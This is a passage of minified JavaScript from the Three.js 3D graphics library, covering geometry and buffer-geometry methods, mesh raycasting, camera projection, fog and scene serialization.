a,b,c,d,e;c=0;for(d=this.faces.length;c<d;c++)for(e=this.faces[c],e.__originalFaceNormal?e.__originalFaceNormal.copy(e.normal):e.__originalFaceNormal=e.normal.clone(),e.__originalVertexNormals||(e.__originalVertexNormals=[]),a=0,b=e.vertexNormals.length;a<b;a++)e.__originalVertexNormals[a]?e.__originalVertexNormals[a].copy(e.vertexNormals[a]):e.__originalVertexNormals[a]=e.vertexNormals[a].clone();var f=new T;f.faces=\nthis.faces;a=0;for(b=this.morphTargets.length;a<b;a++){if(!this.morphNormals[a]){this.morphNormals[a]={};this.morphNormals[a].faceNormals=[];this.morphNormals[a].vertexNormals=[];e=this.morphNormals[a].faceNormals;var g=this.morphNormals[a].vertexNormals,h,m;c=0;for(d=this.faces.length;c<d;c++)h=new q,m={a:new q,b:new q,c:new q},e.push(h),g.push(m)}g=this.morphNormals[a];f.vertices=this.morphTargets[a].vertices;f.computeFaceNormals();f.computeVertexNormals();c=0;for(d=this.faces.length;c<d;c++)e=\nthis.faces[c],h=g.faceNormals[c],m=g.vertexNormals[c],h.copy(e.normal),m.a.copy(e.vertexNormals[0]),m.b.copy(e.vertexNormals[1]),m.c.copy(e.vertexNormals[2])}c=0;for(d=this.faces.length;c<d;c++)e=this.faces[c],e.normal=e.__originalFaceNormal,e.vertexNormals=e.__originalVertexNormals},computeLineDistances:function(){for(var a=0,b=this.vertices,c=0,d=b.length;c<d;c++)0<c&&(a+=b[c].distanceTo(b[c-1])),this.lineDistances[c]=a},computeBoundingBox:function(){null===this.boundingBox&&(this.boundingBox=new Pa);\nthis.boundingBox.setFromPoints(this.vertices)},computeBoundingSphere:function(){null===this.boundingSphere&&(this.boundingSphere=new Na);this.boundingSphere.setFromPoints(this.vertices)},merge:function(a,b,c){if(!1===(a&&a.isGeometry))console.error(\"THREE.Geometry.merge(): geometry not an instance of THREE.Geometry.\",a);else{var d,e=this.vertices.length,f=this.vertices,g=a.vertices,h=this.faces,m=a.faces,k=this.faceVertexUvs[0],l=a.faceVertexUvs[0],p=this.colors,n=a.colors;void 0===c&&(c=0);void 0!==\nb&&(d=(new ya).getNormalMatrix(b));a=0;for(var u=g.length;a<u;a++){var q=g[a].clone();void 0!==b&&q.applyMatrix4(b);f.push(q)}a=0;for(u=n.length;a<u;a++)p.push(n[a].clone());a=0;for(u=m.length;a<u;a++){var g=m[a],r=g.vertexNormals,n=g.vertexColors,p=new ha(g.a+e,g.b+e,g.c+e);p.normal.copy(g.normal);void 0!==d&&p.normal.applyMatrix3(d).normalize();b=0;for(f=r.length;b<f;b++)q=r[b].clone(),void 0!==d&&q.applyMatrix3(d).normalize(),p.vertexNormals.push(q);p.color.copy(g.color);b=0;for(f=n.length;b<f;b++)q=\nn[b],p.vertexColors.push(q.clone());p.materialIndex=g.materialIndex+c;h.push(p)}a=0;for(u=l.length;a<u;a++)if(c=l[a],d=[],void 0!==c){b=0;for(f=c.length;b<f;b++)d.push(c[b].clone());k.push(d)}}},mergeMesh:function(a){!1===(a&&a.isMesh)?console.error(\"THREE.Geometry.mergeMesh(): mesh not an instance of THREE.Mesh.\",a):(a.matrixAutoUpdate&&a.updateMatrix(),this.merge(a.geometry,a.matrix))},mergeVertices:function(){var a={},b=[],c=[],d,e=Math.pow(10,4),f,g;f=0;for(g=this.vertices.length;f<g;f++)d=this.vertices[f],\nd=Math.round(d.x*e)+\"_\"+Math.round(d.y*e)+\"_\"+Math.round(d.z*e),void 0===a[d]?(a[d]=f,b.push(this.vertices[f]),c[f]=b.length-1):c[f]=c[a[d]];a=[];f=0;for(g=this.faces.length;f<g;f++)for(e=this.faces[f],e.a=c[e.a],e.b=c[e.b],e.c=c[e.c],e=[e.a,e.b,e.c],d=0;3>d;d++)if(e[d]===e[(d+1)%3]){a.push(f);break}for(f=a.length-1;0<=f;f--)for(e=a[f],this.faces.splice(e,1),c=0,g=this.faceVertexUvs.length;c<g;c++)this.faceVertexUvs[c].splice(e,1);f=this.vertices.length-b.length;this.vertices=b;return f},sortFacesByMaterialIndex:function(){for(var a=\nthis.faces,b=a.length,c=0;c<b;c++)a[c]._id=c;a.sort(function(a,b){return a.materialIndex-b.materialIndex});var d=this.faceVertexUvs[0],e=this.faceVertexUvs[1],f,g;d&&d.length===b&&(f=[]);e&&e.length===b&&(g=[]);for(c=0;c<b;c++){var h=a[c]._id;f&&f.push(d[h]);g&&g.push(e[h])}f&&(this.faceVertexUvs[0]=f);g&&(this.faceVertexUvs[1]=g)},toJSON:function(){function a(a,b,c){return c?a|1<<b:a&~(1<<b)}function b(a){var b=a.x.toString()+a.y.toString()+a.z.toString();if(void 0!==k[b])return k[b];k[b]=m.length/\n3;m.push(a.x,a.y,a.z);return k[b]}function c(a){var b=a.r.toString()+a.g.toString()+a.b.toString();if(void 0!==p[b])return p[b];p[b]=l.length;l.push(a.getHex());return p[b]}function d(a){var b=a.x.toString()+a.y.toString();if(void 0!==u[b])return u[b];u[b]=n.length/2;n.push(a.x,a.y);return u[b]}var e={metadata:{version:4.4,type:\"Geometry\",generator:\"Geometry.toJSON\"}};e.uuid=this.uuid;e.type=this.type;\"\"!==this.name&&(e.name=this.name);if(void 0!==this.parameters){var f=this.parameters,g;for(g in f)void 0!==\nf[g]&&(e[g]=f[g]);return e}f=[];for(g=0;g<this.vertices.length;g++){var h=this.vertices[g];f.push(h.x,h.y,h.z)}var h=[],m=[],k={},l=[],p={},n=[],u={};for(g=0;g<this.faces.length;g++){var q=this.faces[g],r=void 0!==this.faceVertexUvs[0][g],A=0<q.normal.length(),w=0<q.vertexNormals.length,y=1!==q.color.r||1!==q.color.g||1!==q.color.b,K=0<q.vertexColors.length,v=0,v=a(v,0,0),v=a(v,1,!0),v=a(v,2,!1),v=a(v,3,r),v=a(v,4,A),v=a(v,5,w),v=a(v,6,y),v=a(v,7,K);h.push(v);h.push(q.a,q.b,q.c);h.push(q.materialIndex);\nr&&(r=this.faceVertexUvs[0][g],h.push(d(r[0]),d(r[1]),d(r[2])));A&&h.push(b(q.normal));w&&(A=q.vertexNormals,h.push(b(A[0]),b(A[1]),b(A[2])));y&&h.push(c(q.color));K&&(q=q.vertexColors,h.push(c(q[0]),c(q[1]),c(q[2])))}e.data={};e.data.vertices=f;e.data.normals=m;0<l.length&&(e.data.colors=l);0<n.length&&(e.data.uvs=[n]);e.data.faces=h;return e},clone:function(){return(new T).copy(this)},copy:function(a){var b,c,d,e,f,g;this.vertices=[];this.colors=[];this.faces=[];this.faceVertexUvs=[[]];this.morphTargets=\n[];this.morphNormals=[];this.skinWeights=[];this.skinIndices=[];this.lineDistances=[];this.boundingSphere=this.boundingBox=null;this.name=a.name;d=a.vertices;b=0;for(c=d.length;b<c;b++)this.vertices.push(d[b].clone());d=a.colors;b=0;for(c=d.length;b<c;b++)this.colors.push(d[b].clone());d=a.faces;b=0;for(c=d.length;b<c;b++)this.faces.push(d[b].clone());b=0;for(c=a.faceVertexUvs.length;b<c;b++){var h=a.faceVertexUvs[b];void 0===this.faceVertexUvs[b]&&(this.faceVertexUvs[b]=[]);d=0;for(e=h.length;d<\ne;d++){var m=h[d],k=[];f=0;for(g=m.length;f<g;f++)k.push(m[f].clone());this.faceVertexUvs[b].push(k)}}f=a.morphTargets;b=0;for(c=f.length;b<c;b++){g={};g.name=f[b].name;if(void 0!==f[b].vertices)for(g.vertices=[],d=0,e=f[b].vertices.length;d<e;d++)g.vertices.push(f[b].vertices[d].clone());if(void 0!==f[b].normals)for(g.normals=[],d=0,e=f[b].normals.length;d<e;d++)g.normals.push(f[b].normals[d].clone());this.morphTargets.push(g)}f=a.morphNormals;b=0;for(c=f.length;b<c;b++){g={};if(void 0!==f[b].vertexNormals)for(g.vertexNormals=\n[],d=0,e=f[b].vertexNormals.length;d<e;d++)h=f[b].vertexNormals[d],m={},m.a=h.a.clone(),m.b=h.b.clone(),m.c=h.c.clone(),g.vertexNormals.push(m);if(void 0!==f[b].faceNormals)for(g.faceNormals=[],d=0,e=f[b].faceNormals.length;d<e;d++)g.faceNormals.push(f[b].faceNormals[d].clone());this.morphNormals.push(g)}d=a.skinWeights;b=0;for(c=d.length;b<c;b++)this.skinWeights.push(d[b].clone());d=a.skinIndices;b=0;for(c=d.length;b<c;b++)this.skinIndices.push(d[b].clone());d=a.lineDistances;b=0;for(c=d.length;b<\nc;b++)this.lineDistances.push(d[b]);b=a.boundingBox;null!==b&&(this.boundingBox=b.clone());b=a.boundingSphere;null!==b&&(this.boundingSphere=b.clone());this.elementsNeedUpdate=a.elementsNeedUpdate;this.verticesNeedUpdate=a.verticesNeedUpdate;this.uvsNeedUpdate=a.uvsNeedUpdate;this.normalsNeedUpdate=a.normalsNeedUpdate;this.colorsNeedUpdate=a.colorsNeedUpdate;this.lineDistancesNeedUpdate=a.lineDistancesNeedUpdate;this.groupsNeedUpdate=a.groupsNeedUpdate;return this},dispose:function(){this.dispatchEvent({type:\"dispose\"})}};\nObject.assign(T.prototype,pa.prototype);I.prototype={constructor:I,isBufferGeometry:!0,getIndex:function(){return this.index},setIndex:function(a){Array.isArray(a)?this.index=new (65535<Ud(a)?jb:ib)(a,1):this.index=a},addAttribute:function(a,b,c){if(!1===(b&&b.isBufferAttribute)&&!1===(b&&b.isInterleavedBufferAttribute))console.warn(\"THREE.BufferGeometry: .addAttribute() now expects ( name, attribute ).\"),this.addAttribute(a,new U(b,c));else if(\"index\"===a)console.warn(\"THREE.BufferGeometry.addAttribute: Use .setIndex() for index attribute.\"),\nthis.setIndex(b);else return this.attributes[a]=b,this},getAttribute:function(a){return this.attributes[a]},removeAttribute:function(a){delete this.attributes[a];return this},addGroup:function(a,b,c){this.groups.push({start:a,count:b,materialIndex:void 0!==c?c:0})},clearGroups:function(){this.groups=[]},setDrawRange:function(a,b){this.drawRange.start=a;this.drawRange.count=b},applyMatrix:function(a){var b=this.attributes.position;void 0!==b&&(a.applyToBufferAttribute(b),b.needsUpdate=!0);b=this.attributes.normal;\nvoid 0!==b&&((new ya).getNormalMatrix(a).applyToBufferAttribute(b),b.needsUpdate=!0);null!==this.boundingBox&&this.computeBoundingBox();null!==this.boundingSphere&&this.computeBoundingSphere();return this},rotateX:function(){var a;return function(b){void 0===a&&(a=new S);a.makeRotationX(b);this.applyMatrix(a);return this}}(),rotateY:function(){var a;return function(b){void 0===a&&(a=new S);a.makeRotationY(b);this.applyMatrix(a);return this}}(),rotateZ:function(){var a;return function(b){void 0===\na&&(a=new S);a.makeRotationZ(b);this.applyMatrix(a);return this}}(),translate:function(){var a;return function(b,c,d){void 0===a&&(a=new S);a.makeTranslation(b,c,d);this.applyMatrix(a);return this}}(),scale:function(){var a;return function(b,c,d){void 0===a&&(a=new S);a.makeScale(b,c,d);this.applyMatrix(a);return this}}(),lookAt:function(){var a;return function(b){void 0===a&&(a=new x);a.lookAt(b);a.updateMatrix();this.applyMatrix(a.matrix)}}(),center:function(){this.computeBoundingBox();var a=this.boundingBox.getCenter().negate();\nthis.translate(a.x,a.y,a.z);return a},setFromObject:function(a){var b=a.geometry;if(a.isPoints||a.isLine){a=new z(3*b.vertices.length,3);var c=new z(3*b.colors.length,3);this.addAttribute(\"position\",a.copyVector3sArray(b.vertices));this.addAttribute(\"color\",c.copyColorsArray(b.colors));b.lineDistances&&b.lineDistances.length===b.vertices.length&&(a=new z(b.lineDistances.length,1),this.addAttribute(\"lineDistance\",a.copyArray(b.lineDistances)));null!==b.boundingSphere&&(this.boundingSphere=b.boundingSphere.clone());\nnull!==b.boundingBox&&(this.boundingBox=b.boundingBox.clone())}else a.isMesh&&b&&b.isGeometry&&this.fromGeometry(b);return this},updateFromObject:function(a){var b=a.geometry;if(a.isMesh){var c=b.__directGeometry;!0===b.elementsNeedUpdate&&(c=void 0,b.elementsNeedUpdate=!1);if(void 0===c)return this.fromGeometry(b);c.verticesNeedUpdate=b.verticesNeedUpdate;c.normalsNeedUpdate=b.normalsNeedUpdate;c.colorsNeedUpdate=b.colorsNeedUpdate;c.uvsNeedUpdate=b.uvsNeedUpdate;c.groupsNeedUpdate=b.groupsNeedUpdate;\nb.verticesNeedUpdate=!1;b.normalsNeedUpdate=!1;b.colorsNeedUpdate=!1;b.uvsNeedUpdate=!1;b.groupsNeedUpdate=!1;b=c}!0===b.verticesNeedUpdate&&(c=this.attributes.position,void 0!==c&&(c.copyVector3sArray(b.vertices),c.needsUpdate=!0),b.verticesNeedUpdate=!1);!0===b.normalsNeedUpdate&&(c=this.attributes.normal,void 0!==c&&(c.copyVector3sArray(b.normals),c.needsUpdate=!0),b.normalsNeedUpdate=!1);!0===b.colorsNeedUpdate&&(c=this.attributes.color,void 0!==c&&(c.copyColorsArray(b.colors),c.needsUpdate=!0),\nb.colorsNeedUpdate=!1);b.uvsNeedUpdate&&(c=this.attributes.uv,void 0!==c&&(c.copyVector2sArray(b.uvs),c.needsUpdate=!0),b.uvsNeedUpdate=!1);b.lineDistancesNeedUpdate&&(c=this.attributes.lineDistance,void 0!==c&&(c.copyArray(b.lineDistances),c.needsUpdate=!0),b.lineDistancesNeedUpdate=!1);b.groupsNeedUpdate&&(b.computeGroups(a.geometry),this.groups=b.groups,b.groupsNeedUpdate=!1);return this},fromGeometry:function(a){a.__directGeometry=(new Me).fromGeometry(a);return this.fromDirectGeometry(a.__directGeometry)},\nfromDirectGeometry:function(a){var b=new Float32Array(3*a.vertices.length);this.addAttribute(\"position\",(new U(b,3)).copyVector3sArray(a.vertices));0<a.normals.length&&(b=new Float32Array(3*a.normals.length),this.addAttribute(\"normal\",(new U(b,3)).copyVector3sArray(a.normals)));0<a.colors.length&&(b=new Float32Array(3*a.colors.length),this.addAttribute(\"color\",(new U(b,3)).copyColorsArray(a.colors)));0<a.uvs.length&&(b=new Float32Array(2*a.uvs.length),this.addAttribute(\"uv\",(new U(b,2)).copyVector2sArray(a.uvs)));\n0<a.uvs2.length&&(b=new Float32Array(2*a.uvs2.length),this.addAttribute(\"uv2\",(new U(b,2)).copyVector2sArray(a.uvs2)));0<a.indices.length&&(b=new (65535<Ud(a.indices)?Uint32Array:Uint16Array)(3*a.indices.length),this.setIndex((new U(b,1)).copyIndicesArray(a.indices)));this.groups=a.groups;for(var c in a.morphTargets){for(var b=[],d=a.morphTargets[c],e=0,f=d.length;e<f;e++){var g=d[e],h=new z(3*g.length,3);b.push(h.copyVector3sArray(g))}this.morphAttributes[c]=b}0<a.skinIndices.length&&(c=new z(4*\na.skinIndices.length,4),this.addAttribute(\"skinIndex\",c.copyVector4sArray(a.skinIndices)));0<a.skinWeights.length&&(c=new z(4*a.skinWeights.length,4),this.addAttribute(\"skinWeight\",c.copyVector4sArray(a.skinWeights)));null!==a.boundingSphere&&(this.boundingSphere=a.boundingSphere.clone());null!==a.boundingBox&&(this.boundingBox=a.boundingBox.clone());return this},computeBoundingBox:function(){null===this.boundingBox&&(this.boundingBox=new Pa);var a=this.attributes.position;void 0!==a?this.boundingBox.setFromBufferAttribute(a):\nthis.boundingBox.makeEmpty();(isNaN(this.boundingBox.min.x)||isNaN(this.boundingBox.min.y)||isNaN(this.boundingBox.min.z))&&console.error('THREE.BufferGeometry.computeBoundingBox: Computed min/max have NaN values. The \"position\" attribute is likely to have NaN values.',this)},computeBoundingSphere:function(){var a=new Pa,b=new q;return function(){null===this.boundingSphere&&(this.boundingSphere=new Na);var c=this.attributes.position;if(c){var d=this.boundingSphere.center;a.setFromBufferAttribute(c);\na.getCenter(d);for(var e=0,f=0,g=c.count;f<g;f++)b.x=c.getX(f),b.y=c.getY(f),b.z=c.getZ(f),e=Math.max(e,d.distanceToSquared(b));this.boundingSphere.radius=Math.sqrt(e);isNaN(this.boundingSphere.radius)&&console.error('THREE.BufferGeometry.computeBoundingSphere(): Computed radius is NaN. The \"position\" attribute is likely to have NaN values.',this)}}}(),computeFaceNormals:function(){},computeVertexNormals:function(){var a=this.index,b=this.attributes,c=this.groups;if(b.position){var d=b.position.array;\nif(void 0===b.normal)this.addAttribute(\"normal\",new U(new Float32Array(d.length),3));else for(var e=b.normal.array,f=0,g=e.length;f<g;f++)e[f]=0;var e=b.normal.array,h,m,k,l=new q,p=new q,n=new q,u=new q,G=new q;if(a){a=a.array;0===c.length&&this.addGroup(0,a.length);for(var r=0,A=c.length;r<A;++r)for(f=c[r],g=f.start,h=f.count,f=g,g+=h;f<g;f+=3)h=3*a[f+0],m=3*a[f+1],k=3*a[f+2],l.fromArray(d,h),p.fromArray(d,m),n.fromArray(d,k),u.subVectors(n,p),G.subVectors(l,p),u.cross(G),e[h]+=u.x,e[h+1]+=u.y,\ne[h+2]+=u.z,e[m]+=u.x,e[m+1]+=u.y,e[m+2]+=u.z,e[k]+=u.x,e[k+1]+=u.y,e[k+2]+=u.z}else for(f=0,g=d.length;f<g;f+=9)l.fromArray(d,f),p.fromArray(d,f+3),n.fromArray(d,f+6),u.subVectors(n,p),G.subVectors(l,p),u.cross(G),e[f]=u.x,e[f+1]=u.y,e[f+2]=u.z,e[f+3]=u.x,e[f+4]=u.y,e[f+5]=u.z,e[f+6]=u.x,e[f+7]=u.y,e[f+8]=u.z;this.normalizeNormals();b.normal.needsUpdate=!0}},merge:function(a,b){if(!1===(a&&a.isBufferGeometry))console.error(\"THREE.BufferGeometry.merge(): geometry not an instance of THREE.BufferGeometry.\",\na);else{void 0===b&&(b=0);var c=this.attributes,d;for(d in c)if(void 0!==a.attributes[d])for(var e=c[d].array,f=a.attributes[d],g=f.array,h=0,f=f.itemSize*b;h<g.length;h++,f++)e[f]=g[h];return this}},normalizeNormals:function(){for(var a=this.attributes.normal.array,b,c,d,e=0,f=a.length;e<f;e+=3)b=a[e],c=a[e+1],d=a[e+2],b=1/Math.sqrt(b*b+c*c+d*d),a[e]*=b,a[e+1]*=b,a[e+2]*=b},toNonIndexed:function(){if(null===this.index)return console.warn(\"THREE.BufferGeometry.toNonIndexed(): Geometry is already non-indexed.\"),\nthis;var a=new I,b=this.index.array,c=this.attributes,d;for(d in c){for(var e=c[d],f=e.array,e=e.itemSize,g=new f.constructor(b.length*e),h,m=0,k=0,l=b.length;k<l;k++){h=b[k]*e;for(var p=0;p<e;p++)g[m++]=f[h++]}a.addAttribute(d,new U(g,e))}return a},toJSON:function(){var a={metadata:{version:4.4,type:\"BufferGeometry\",generator:\"BufferGeometry.toJSON\"}};a.uuid=this.uuid;a.type=this.type;\"\"!==this.name&&(a.name=this.name);if(void 0!==this.parameters){var b=this.parameters,c;for(c in b)void 0!==b[c]&&\n(a[c]=b[c]);return a}a.data={attributes:{}};var d=this.index;null!==d&&(b=Array.prototype.slice.call(d.array),a.data.index={type:d.array.constructor.name,array:b});d=this.attributes;for(c in d){var e=d[c],b=Array.prototype.slice.call(e.array);a.data.attributes[c]={itemSize:e.itemSize,type:e.array.constructor.name,array:b,normalized:e.normalized}}c=this.groups;0<c.length&&(a.data.groups=JSON.parse(JSON.stringify(c)));c=this.boundingSphere;null!==c&&(a.data.boundingSphere={center:c.center.toArray(),\nradius:c.radius});return a},clone:function(){return(new I).copy(this)},copy:function(a){var b,c,d;this.index=null;this.attributes={};this.morphAttributes={};this.groups=[];this.boundingSphere=this.boundingBox=null;this.name=a.name;c=a.index;null!==c&&this.setIndex(c.clone());c=a.attributes;for(b in c)this.addAttribute(b,c[b].clone());var e=a.morphAttributes;for(b in e){var f=[],g=e[b];c=0;for(d=g.length;c<d;c++)f.push(g[c].clone());this.morphAttributes[b]=f}b=a.groups;c=0;for(d=b.length;c<d;c++)e=\nb[c],this.addGroup(e.start,e.count,e.materialIndex);b=a.boundingBox;null!==b&&(this.boundingBox=b.clone());b=a.boundingSphere;null!==b&&(this.boundingSphere=b.clone());this.drawRange.start=a.drawRange.start;this.drawRange.count=a.drawRange.count;return this},dispose:function(){this.dispatchEvent({type:\"dispose\"})}};I.MaxIndex=65535;Object.assign(I.prototype,pa.prototype);Aa.prototype=Object.assign(Object.create(x.prototype),{constructor:Aa,isMesh:!0,setDrawMode:function(a){this.drawMode=a},copy:function(a){x.prototype.copy.call(this,\na);this.drawMode=a.drawMode;return this},updateMorphTargets:function(){var a=this.geometry.morphTargets;if(void 0!==a&&0<a.length){this.morphTargetInfluences=[];this.morphTargetDictionary={};for(var b=0,c=a.length;b<c;b++)this.morphTargetInfluences.push(0),this.morphTargetDictionary[a[b].name]=b}},raycast:function(){function a(a,b,c,d,e,f,g){za.barycoordFromPoint(a,b,c,d,r);e.multiplyScalar(r.x);f.multiplyScalar(r.y);g.multiplyScalar(r.z);e.add(f).add(g);return e.clone()}function b(a,b,c,d,e,f,g){var h=\na.material;if(null===(1===h.side?c.intersectTriangle(f,e,d,!0,g):c.intersectTriangle(d,e,f,2!==h.side,g)))return null;w.copy(g);w.applyMatrix4(a.matrixWorld);c=b.ray.origin.distanceTo(w);return c<b.near||c>b.far?null:{distance:c,point:w.clone(),object:a}}function c(c,d,e,f,k,l,p,t){g.fromBufferAttribute(f,l);h.fromBufferAttribute(f,p);m.fromBufferAttribute(f,t);if(c=b(c,d,e,g,h,m,A))k&&(n.fromBufferAttribute(k,l),u.fromBufferAttribute(k,p),G.fromBufferAttribute(k,t),c.uv=a(A,g,h,m,n,u,G)),c.face=\nnew ha(l,p,t,za.normal(g,h,m)),c.faceIndex=l;return c}var d=new S,e=new cb,f=new Na,g=new q,h=new q,m=new q,k=new q,l=new q,p=new q,n=new D,u=new D,G=new D,r=new q,A=new q,w=new q;return function(q,r){var v=this.geometry,w=this.material,L=this.matrixWorld;if(void 0!==w&&(null===v.boundingSphere&&v.computeBoundingSphere(),f.copy(v.boundingSphere),f.applyMatrix4(L),!1!==q.ray.intersectsSphere(f)&&(d.getInverse(L),e.copy(q.ray).applyMatrix4(d),null===v.boundingBox||!1!==e.intersectsBox(v.boundingBox)))){var C;\nif(v.isBufferGeometry){var F,x,w=v.index,H=v.attributes.position,L=v.attributes.uv,D,z;if(null!==w)for(D=0,z=w.count;D<z;D+=3){if(v=w.getX(D),F=w.getX(D+1),x=w.getX(D+2),C=c(this,q,e,H,L,v,F,x))C.faceIndex=Math.floor(D/3),r.push(C)}else for(D=0,z=H.count;D<z;D+=3)if(v=D,F=D+1,x=D+2,C=c(this,q,e,H,L,v,F,x))C.index=v,r.push(C)}else if(v.isGeometry){var J,I,L=w&&w.isMultiMaterial;D=!0===L?w.materials:null;z=v.vertices;F=v.faces;x=v.faceVertexUvs[0];0<x.length&&(H=x);for(var Q=0,M=F.length;Q<M;Q++){var O=\nF[Q];C=!0===L?D[O.materialIndex]:w;if(void 0!==C){x=z[O.a];J=z[O.b];I=z[O.c];if(!0===C.morphTargets){C=v.morphTargets;var P=this.morphTargetInfluences;g.set(0,0,0);h.set(0,0,0);m.set(0,0,0);for(var T=0,W=C.length;T<W;T++){var S=P[T];if(0!==S){var R=C[T].vertices;g.addScaledVector(k.subVectors(R[O.a],x),S);h.addScaledVector(l.subVectors(R[O.b],J),S);m.addScaledVector(p.subVectors(R[O.c],I),S)}}g.add(x);h.add(J);m.add(I);x=g;J=h;I=m}if(C=b(this,q,e,x,J,I,A))H&&(P=H[Q],n.copy(P[0]),u.copy(P[1]),G.copy(P[2]),\nC.uv=a(A,x,J,I,n,u,G)),C.face=O,C.faceIndex=Q,r.push(C)}}}}}}(),clone:function(){return(new this.constructor(this.geometry,this.material)).copy(this)}});Ib.prototype=Object.create(T.prototype);Ib.prototype.constructor=Ib;kb.prototype=Object.create(I.prototype);kb.prototype.constructor=kb;Ac.prototype=Object.create(T.prototype);Ac.prototype.constructor=Ac;lb.prototype=Object.create(I.prototype);lb.prototype.constructor=lb;ra.prototype=Object.create(x.prototype);ra.prototype.constructor=ra;ra.prototype.isCamera=\n!0;ra.prototype.getWorldDirection=function(){var a=new ca;return function(b){b=b||new q;this.getWorldQuaternion(a);return b.set(0,0,-1).applyQuaternion(a)}}();ra.prototype.lookAt=function(){var a=new S;return function(b){a.lookAt(this.position,b,this.up);this.quaternion.setFromRotationMatrix(a)}}();ra.prototype.clone=function(){return(new this.constructor).copy(this)};ra.prototype.copy=function(a){x.prototype.copy.call(this,a);this.matrixWorldInverse.copy(a.matrixWorldInverse);this.projectionMatrix.copy(a.projectionMatrix);\nreturn this};Fa.prototype=Object.assign(Object.create(ra.prototype),{constructor:Fa,isPerspectiveCamera:!0,copy:function(a){ra.prototype.copy.call(this,a);this.fov=a.fov;this.zoom=a.zoom;this.near=a.near;this.far=a.far;this.focus=a.focus;this.aspect=a.aspect;this.view=null===a.view?null:Object.assign({},a.view);this.filmGauge=a.filmGauge;this.filmOffset=a.filmOffset;return this},setFocalLength:function(a){a=.5*this.getFilmHeight()/a;this.fov=2*N.RAD2DEG*Math.atan(a);this.updateProjectionMatrix()},\ngetFocalLength:function(){var a=Math.tan(.5*N.DEG2RAD*this.fov);return.5*this.getFilmHeight()/a},getEffectiveFOV:function(){return 2*N.RAD2DEG*Math.atan(Math.tan(.5*N.DEG2RAD*this.fov)/this.zoom)},getFilmWidth:function(){return this.filmGauge*Math.min(this.aspect,1)},getFilmHeight:function(){return this.filmGauge/Math.max(this.aspect,1)},setViewOffset:function(a,b,c,d,e,f){this.aspect=a/b;this.view={fullWidth:a,fullHeight:b,offsetX:c,offsetY:d,width:e,height:f};this.updateProjectionMatrix()},clearViewOffset:function(){this.view=\nnull;this.updateProjectionMatrix()},updateProjectionMatrix:function(){var a=this.near,b=a*Math.tan(.5*N.DEG2RAD*this.fov)/this.zoom,c=2*b,d=this.aspect*c,e=-.5*d,f=this.view;if(null!==f)var g=f.fullWidth,h=f.fullHeight,e=e+f.offsetX*d/g,b=b-f.offsetY*c/h,d=f.width/g*d,c=f.height/h*c;f=this.filmOffset;0!==f&&(e+=a*f/this.getFilmWidth());this.projectionMatrix.makePerspective(e,e+d,b,b-c,a,this.far)},toJSON:function(a){a=x.prototype.toJSON.call(this,a);a.object.fov=this.fov;a.object.zoom=this.zoom;a.object.near=\nthis.near;a.object.far=this.far;a.object.focus=this.focus;a.object.aspect=this.aspect;null!==this.view&&(a.object.view=Object.assign({},this.view));a.object.filmGauge=this.filmGauge;a.object.filmOffset=this.filmOffset;return a}});Jb.prototype=Object.assign(Object.create(ra.prototype),{constructor:Jb,isOrthographicCamera:!0,copy:function(a){ra.prototype.copy.call(this,a);this.left=a.left;this.right=a.right;this.top=a.top;this.bottom=a.bottom;this.near=a.near;this.far=a.far;this.zoom=a.zoom;this.view=\nnull===a.view?null:Object.assign({},a.view);return this},setViewOffset:function(a,b,c,d,e,f){this.view={fullWidth:a,fullHeight:b,offsetX:c,offsetY:d,width:e,height:f};this.updateProjectionMatrix()},clearViewOffset:function(){this.view=null;this.updateProjectionMatrix()},updateProjectionMatrix:function(){var a=(this.right-this.left)/(2*this.zoom),b=(this.top-this.bottom)/(2*this.zoom),c=(this.right+this.left)/2,d=(this.top+this.bottom)/2,e=c-a,c=c+a,a=d+b,b=d-b;if(null!==this.view)var c=this.zoom/\n(this.view.width/this.view.fullWidth),b=this.zoom/(this.view.height/this.view.fullHeight),f=(this.right-this.left)/this.view.width,d=(this.top-this.bottom)/this.view.height,e=e+this.view.offsetX/c*f,c=e+this.view.width/c*f,a=a-this.view.offsetY/b*d,b=a-this.view.height/b*d;this.projectionMatrix.makeOrthographic(e,c,a,b,this.near,this.far)},toJSON:function(a){a=x.prototype.toJSON.call(this,a);a.object.zoom=this.zoom;a.object.left=this.left;a.object.right=this.right;a.object.top=this.top;a.object.bottom=\nthis.bottom;a.object.near=this.near;a.object.far=this.far;null!==this.view&&(a.object.view=Object.assign({},this.view));return a}});var Lf=0;Kb.prototype.isFogExp2=!0;Kb.prototype.clone=function(){return new Kb(this.color.getHex(),this.density)};Kb.prototype.toJSON=function(a){return{type:\"FogExp2\",color:this.color.getHex(),density:this.density}};Lb.prototype.isFog=!0;Lb.prototype.clone=function(){return new Lb(this.color.getHex(),this.near,this.far)};Lb.prototype.toJSON=function(a){return{type:\"Fog\",\ncolor:this.color.getHex(),near:this.near,far:this.far}};mb.prototype=Object.create(x.prototype);mb.prototype.constructor=mb;mb.prototype.copy=function(a,b){x.prototype.copy.call(this,a,b);null!==a.background&&(this.background=a.background.clone());null!==a.fog&&(this.fog=a.fog.clone());null!==a.overrideMaterial&&(this.overrideMaterial=a.overrideMaterial.clone());this.autoUpdate=a.autoUpdate;this.matrixAutoUpdate=a.matrixAutoUpdate;return this};mb.prototype.toJSON=function(a){var b=x.prototype.toJSON.call(this,\na);null!==this.background&&(b.object.background=this.background.toJSON(a));null!==this.fog&&(b.object.fog=this.fog.toJSON());return b};Zd.prototype=Object.assign(Object.create(x.prototype),{constructor:Zd,isLensFlare:!0,copy:function(a){x.prototype.copy.call(this,a);this.positionScreen.copy(a.positionScreen);this.customUpdateCallback=a.customUpdateCallback;for(var b=0,c=a.lensFlares.length;b<c;b++)this.lensFlares.push(a.lensFlares[b]);return this},add:function(a,b,c,d,e,f){void 0===b&&(b=-1);void 0===\nc&&(c=0);void 0===f&&(f=1);void 0===e&&(e=new J(16777215));void 0===d&&(d=1);c=Math.min(c,Math.max(0,c));this.lensFlares.push({texture:a,size:b,distance:c,x:0,y:0,z:0,scale:1,rotation:0,opacity:f,color:e,blending:d})},updateLensFlares:function(){var a,b=this.lensFlares.length,c,d=2*-this.positionScreen.x,e=2*-this.positionScreen.y;for(a=0;a<b;a++)c=this.lensFlares[a],c.x=this.positionScreen.x+d*c.distance,c.y=this.positionScreen.y+e*c.distance,c.wantedRotation=c.x*Math.PI*.25,c.rotation+=.25*(c.wantedRotation-\nc.rotation)}});nb.prototype=Object.create(X.prototype);nb.prototype.constructor=nb;nb.prototype.copy=function(a){X.prototype.copy.call(this,a);this.color.copy(a.color);this.map=a.map;this.rotation=a.rotation;return 